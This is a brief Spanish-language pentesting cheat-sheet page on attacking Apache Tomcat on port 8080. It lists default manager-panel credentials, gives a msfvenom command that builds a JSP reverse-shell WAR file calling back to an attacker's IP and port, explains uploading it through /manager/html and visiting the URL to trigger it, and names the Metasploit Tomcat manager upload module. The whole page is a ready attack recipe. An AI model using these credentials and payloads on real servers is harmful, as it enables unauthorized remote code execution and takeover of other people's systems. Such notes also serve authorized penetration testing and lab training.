---
title: "Apache Tomcat (8080)"
layout: "single"
category: "Servicios"
slug: "servicios/apache-tomcat"
date: "2025-11-26"
---

### Credenciales por Defecto
Panel: `/manager/html`
* `admin` : `admin`
* `tomcat` : `tomcat`
* `root` : `password`

### RCE: Subir WAR Malicioso
**1. Generar Payload:**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
```
**2. Subir:** Desde `/manager/html` sube el `.war`.
**3. Ejecutar:** Visita `http://<IP>:8080/shell/`

### Metasploit
```bash
use exploit/multi/http/tomcat_mgr_upload
```
